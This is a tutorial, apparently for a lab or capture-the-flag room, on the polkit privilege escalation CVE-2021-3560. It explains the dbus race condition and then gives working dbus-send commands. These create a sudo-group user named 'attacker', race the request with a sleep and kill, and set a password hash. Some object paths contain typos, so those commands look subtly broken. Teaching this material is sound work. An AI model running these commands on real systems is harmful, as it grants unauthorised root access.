# Polkit vulnerabilities in Linux

## Overview

In early 2021 a researcher named Kevin Backhouse discovered a seven year old privilege escalation vulnerability (since designated CVE-2021-3560) in the Linux polkit utility. Fortunately, different distributions of Linux (and even different versions of the same distributions) use different versions of the software,k meaning that only some are vulnerable.

Specifically, the following mainstream distributions, amongst others, were vulnerable:

- Read hat Enterprise Linux 8
- Fedora 21 (or later)
- Debian Testing ("Bullseye")
- Ubuntu 20.04 LTS ("Focal Fossa")

All should now have released patched versions of their respective polkit packages, however, if you encounter one of these distributions then it may still be vulnerable if it hasn't been updated for a while.

## What is polkit?

Polkit is part of the Linux authorisation system. In effect, when you try to perform an action which requires a higher level of privileges, the policy toolkit can be used to determine whether you have the requisite permissions. It is integrated with systemd and is much more configurable than the traditional sudo system. Indeed, it is sometimes referred to as the "sudo of systemd".

When interacting with polkit we can use pkexec, instead of sud. As an example, attempting to run the useradd commnad through pkexec in a GUI session results in a pop-up asking for credentials:

```bash
pkexec useradd test1234
```

In a CLI session, we get text-based prompt instead.

To summarise, the policy toolkit can be thought of as a fine-grained alternative to the simpler sudo system.

## How is Polkit vulnerable?

The short answer is: by manually sending dbus messages to the dbus-daemon (effectively an API to allow different processes the ability to communicate with each other), then killing the request berfore it has been fully processed, we can trick polkit into authorising the command. If you are not familiar with daemons, they are effectively background services running on Linux. The dbus-daemon is a program running in the background which brokers messages between applications.

The full article about the vulnerability can be found [here](https://github.blog/2024-06-10-privilege-escalation-polkit-root-on-linux-with-bug/#about)

In short the vulnerability can be exploited as below:

1. The attacker manually sends a dbus message to the accounts-daemon requesting the creation of a new account with sudo permissions (or latterly, a password to be set for the new user), This message gets given a unique ID by the dbus-daemon.
2. The attacker kills the message after polkit receives it, but before polkit has a chance to process the message. This effectively destroys the unique message ID.
3. Polkit asks the dbus-daemon for the user ID of the user who sent the message, referencing the (now deleted) message ID.
4. The dbus-daemon can't find the message ID because we killed it in step two. It handles the error by responding with an error code.
5. Polkit mishandles the error and substitutes in 0 for the user ID -- i.e. the root account of the machine.
6. Thinking that the root user requested the action, polkit allows the request to go through unchallenged.

In short, by destroying the message ID before the dbus-daemon has a chance to give polkit the correct ID, we exploit the poor error-handling in polkit to trick the utility into thinking that the request was made by the all-powerful root user.

## Exploitation process

The dbus message for creating user is as follows:

```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /ort/freedesktop/Accounts org.freedesktop.Account.CreateUser string:attacker string:"Pentester Account" int32:1
```

This command will manually send a dbus message to the accounts daemon, printing the response and creating a new user called attacker (**string:attacker**) with a description of "Pentester Account" (**string:"Pentester Account"**) and membership of the sudo group set to true (referenced by the **int32:1** flag).

Our second message will set password for the account:

```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Account/User<User_ID> org.freedesktop.Accounts.User.SetPassword string:<PASSWORD_HASH> string:'Ask the pentester'
```

This once again sends a dbus message to the accounts daemon, requesting a password change for the user with an ID which we specify, a password hash which we need to generate manually, and a hint ('Ask the pentester')

As this is effectively a race condition, we first need to determine how long our command will take to run. Let's try this with the first dbus message:

```bash
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /ort/freedesktop/Accounts org.freedesktop.Account.CreateUser string:attacker string:"Pentester Account" int32:1
```

This takes 0.011 seconds, or 11 milliseconds. We need to kill the command approximately halfway through execution. Five milliseconds usually works fairly well on the provided machine; however, be aware that this is not an exact thing. You may need to change the sleep time, or run the command several times before it works. That said, once you find a time that works, it should work consistently. If you are struggling to get a working time, putting the command inside a bash for loop and quickly running through a range of times tends to work fairly well.

Let's try this. We need to send the dbus message, then kill it about halfway through:

```bash
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /ort/freedesktop/Accounts org.freedesktop.Account.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
```

With the above command we sent the dbus message in a background job (using the ampersand to background the command). We then told it to sleep for 5 milliseconds (**sleep 0.005s**), then kill the previous process (**kill $!**). This successsfully created the new user, adding them into the sudo group. Now we should note down the user ID by the command ```id attacker```.

We need a password hash here, so let's generate a Sha512Crypt hash for our chosen password (**Expl01ted**):

```bash
openssl passwd -6 Expl01ted
```
